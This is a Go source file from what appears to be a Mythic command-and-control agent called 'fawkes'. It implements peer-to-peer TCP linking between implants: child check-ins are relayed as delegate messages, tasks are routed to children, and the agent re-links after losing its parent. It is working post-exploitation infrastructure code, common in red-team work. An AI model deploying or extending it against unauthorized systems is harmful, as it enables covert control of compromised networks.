package tcp

import (
	"encoding/base64"
	"encoding/json"
	"log"
	"net"
	"time"

	"fawkes/pkg/structs"
)

// AddChildConnection registers a new linked child agent connection.
// Called by the link command when an egress agent connects to a child.
func (t *TCPProfile) AddChildConnection(uuid string, conn net.Conn) {
	t.childMu.Lock()
	t.childConns[uuid] = conn
	t.childMu.Unlock()

	// Start reading from this child in a goroutine
	go t.readFromChild(uuid, conn)
}

// RemoveChildConnection removes a linked child agent connection.
func (t *TCPProfile) RemoveChildConnection(uuid string) {
	t.childMu.Lock()
	if conn, ok := t.childConns[uuid]; ok {
		conn.Close()
		delete(t.childConns, uuid)
	}
	t.childMu.Unlock()
}

// GetChildUUIDs returns the UUIDs of all connected child agents.
func (t *TCPProfile) GetChildUUIDs() []string {
	t.childMu.RLock()
	defer t.childMu.RUnlock()
	uuids := make([]string, 0, len(t.childConns))
	for uuid := range t.childConns {
		uuids = append(uuids, uuid)
	}
	return uuids
}

// DrainDelegatesOnly non-blockingly drains only pending delegate messages (not edges).
// Used by GetTasking which cannot include edges in the request.
func (t *TCPProfile) DrainDelegatesOnly() []structs.DelegateMessage {
	var delegates []structs.DelegateMessage
	for {
		select {
		case d := <-t.InboundDelegates:
			delegates = append(delegates, d)
		default:
			return delegates
		}
	}
}

// DrainDelegatesAndEdges non-blockingly drains all pending delegate messages and edge notifications.
// Used by PostResponse which can include both delegates and edges.
func (t *TCPProfile) DrainDelegatesAndEdges() ([]structs.DelegateMessage, []structs.P2PConnectionMessage) {
	var delegates []structs.DelegateMessage
	var edges []structs.P2PConnectionMessage
	for {
		select {
		case d := <-t.InboundDelegates:
			delegates = append(delegates, d)
		default:
			goto doneD
		}
	}
doneD:
	for {
		select {
		case e := <-t.EdgeMessages:
			edges = append(edges, e)
		default:
			goto doneE
		}
	}
doneE:
	return delegates, edges
}

// RouteToChildren routes delegate messages from Mythic to the appropriate child TCP connections.
// Used by the HTTP profile's HandleDelegates hook.
func (t *TCPProfile) RouteToChildren(delegates []structs.DelegateMessage) {
	t.routeDelegatesToChildren(delegates)
}

// --- Internal methods ---

// handleDeadParent marks the parent connection as dead and triggers relink.
func (t *TCPProfile) handleDeadParent() {
	t.parentMu.Lock()
	if t.parentConn != nil {
		t.parentConn.Close()
		t.parentConn = nil
	}
	t.parentMu.Unlock()

	t.needsParentMu.Lock()
	t.needsParent = true
	t.needsParentMu.Unlock()

	log.Printf("peer lost, waiting")
}

// triggerRelink signals that this agent needs a new parent and blocks until one connects.
func (t *TCPProfile) triggerRelink() {
	t.needsParentMu.Lock()
	alreadyNeeds := t.needsParent
	t.needsParent = true
	t.needsParentMu.Unlock()

	// No listener means no way to accept a new parent — don't block
	if t.listener == nil {
		return
	}

	if !alreadyNeeds {
		log.Printf("relink waiting")
	}

	// Wait for acceptChildConnections to provide a new parent (with timeout)
	// The main loop will retry after its normal sleep interval
	select {
	case <-t.parentReady:
		log.Printf("relink connected")
	case <-time.After(5 * time.Second):
		// Short wait — main loop will retry
	}
}

// acceptChildConnections keeps accepting new TCP connections after initial checkin.
// These are additional child agents linking to this agent, OR a new parent during relink.
func (t *TCPProfile) acceptChildConnections() {
	if t.listener == nil {
		return
	}
	// Remove the deadline for ongoing accept (TCP listeners only)
	if tcpL, ok := t.listener.(*net.TCPListener); ok {
		tcpL.SetDeadline(time.Time{})
	}
	for {
		conn, err := t.listener.Accept()
		if err != nil {
			log.Printf("accept error: %v", err)
			return
		}

		// Check if we need a new parent (relink scenario)
		t.needsParentMu.Lock()
		needsParent := t.needsParent
		t.needsParentMu.Unlock()

		if needsParent {
			log.Printf("peer connected %s (relink)", conn.RemoteAddr())
			go t.handleRelink(conn)
		} else {
			log.Printf("downstream connected from %s", conn.RemoteAddr())
			go t.handleNewChildCheckin(conn)
		}
	}
}

// handleRelink handles a new parent connection after the previous parent disconnected.
// It re-sends the cached checkin data so the new parent can forward it to Mythic as a delegate.
func (t *TCPProfile) handleRelink(conn net.Conn) {
	if len(t.cachedCheckinData) == 0 {
		log.Printf("no cached data, treating as downstream")
		t.handleNewChildCheckin(conn)
		return
	}

	// Send cached checkin data to the new parent
	if err := t.sendTCP(conn, t.cachedCheckinData); err != nil {
		log.Printf("relink send error: %v", err)
		conn.Close()
		return
	}
	log.Printf("relink sent cached data")

	// Read checkin response from parent (Mythic's response forwarded by parent)
	respData, err := t.recvTCP(conn)
	if err != nil {
		log.Printf("relink recv error: %v", err)
		conn.Close()
		return
	}

	// Process response — update callback UUID if provided
	if t.getEncryptionKey() != "" {
		decodedData, err := base64.StdEncoding.DecodeString(string(respData))
		if err == nil {
			decryptedResponse, err := t.decryptResponse(decodedData)
			if err == nil {
				var checkinResponse map[string]interface{}
				if err := json.Unmarshal(decryptedResponse, &checkinResponse); err == nil {
					if callbackID, exists := checkinResponse["id"]; exists {
						if callbackStr, ok := callbackID.(string); ok {
							t.UpdateCallbackUUID(callbackStr)
						}
					}
				}
			}
		}
	}

	// Set as new parent connection
	t.parentMu.Lock()
	t.parentConn = conn
	t.parentMu.Unlock()

	// Clear the needs-parent flag
	t.needsParentMu.Lock()
	t.needsParent = false
	t.needsParentMu.Unlock()

	// Signal that parent is ready
	select {
	case t.parentReady <- struct{}{}:
	default:
	}

	log.Printf("relink complete from %s", conn.RemoteAddr())
}

// handleNewChildCheckin reads the initial checkin from a new child connection,
// wraps it as a delegate message, and forwards to Mythic through InboundDelegates.
func (t *TCPProfile) handleNewChildCheckin(conn net.Conn) {
	data, err := t.recvTCP(conn)
	if err != nil {
		log.Printf("downstream read error: %v", err)
		conn.Close()
		return
	}

	// The child's checkin is base64(UUID + encrypted_body)
	// We need to extract the UUID to track this connection
	decoded, err := base64.StdEncoding.DecodeString(string(data))
	if err != nil || len(decoded) < 36 {
		log.Printf("invalid downstream data")
		conn.Close()
		return
	}
	childUUID := string(decoded[:36])

	// Register this child connection
	t.childMu.Lock()
	t.childConns[childUUID] = conn
	t.childMu.Unlock()

	// Forward the checkin as a delegate message to Mythic
	t.InboundDelegates <- structs.DelegateMessage{
		Message:       string(data), // Already base64 encoded
		UUID:          childUUID,
		C2ProfileName: "tcp",
	}

	// Start reading from this child
	go t.readFromChild(childUUID, conn)
}

// StartReadFromChild starts a goroutine to continuously read messages from a child connection.
// Used by the link command after establishing a connection to a child agent.
func (t *TCPProfile) StartReadFromChild(uuid string, conn net.Conn) {
	go t.readFromChild(uuid, conn)
}

// readFromChild continuously reads messages from a child connection
// and forwards them as delegate messages to the parent/Mythic.
func (t *TCPProfile) readFromChild(uuid string, conn net.Conn) {
	for {
		data, err := t.recvTCP(conn)
		if err != nil {
			log.Printf("downstream %s disconnected: %v", uuid[:8], err)
			t.RemoveChildConnection(t.resolveUUID(uuid))
			// Send edge removal
			t.EdgeMessages <- structs.P2PConnectionMessage{
				Source:        t.GetCallbackUUID(),
				Destination:   t.resolveUUID(uuid),
				Action:        "remove",
				C2ProfileName: "tcp",
			}
			return
		}

		// Forward as delegate message
		t.InboundDelegates <- structs.DelegateMessage{
			Message:       string(data),
			UUID:          t.resolveUUID(uuid),
			C2ProfileName: "tcp",
		}
	}
}

// routeDelegatesToChildren routes delegate messages from Mythic to the appropriate child connections.
func (t *TCPProfile) routeDelegatesToChildren(delegates []structs.DelegateMessage) {
	for _, d := range delegates {
		// Handle UUID mapping (staging: Mythic corrects temp UUID to real UUID)
		if d.MythicUUID != "" && d.MythicUUID != d.UUID {
			t.uuidMu.Lock()
			t.uuidMapping[d.UUID] = d.MythicUUID
			// Update child connection tracking
			t.childMu.Lock()
			if conn, ok := t.childConns[d.UUID]; ok {
				t.childConns[d.MythicUUID] = conn
				delete(t.childConns, d.UUID)
			}
			t.childMu.Unlock()
			t.uuidMu.Unlock()
		}

		targetUUID := d.UUID
		if d.MythicUUID != "" {
			targetUUID = d.MythicUUID
		}

		t.childMu.RLock()
		conn, ok := t.childConns[targetUUID]
		t.childMu.RUnlock()

		if !ok {
			// Try original UUID
			t.childMu.RLock()
			conn, ok = t.childConns[d.UUID]
			t.childMu.RUnlock()
		}

		if ok {
			if err := t.sendTCP(conn, []byte(d.Message)); err != nil {
				log.Printf("forward error to %s: %v", targetUUID[:8], err)
				t.RemoveChildConnection(targetUUID)
			}
		} else {
			log.Printf("no downstream for %s", targetUUID[:8])
		}
	}
}
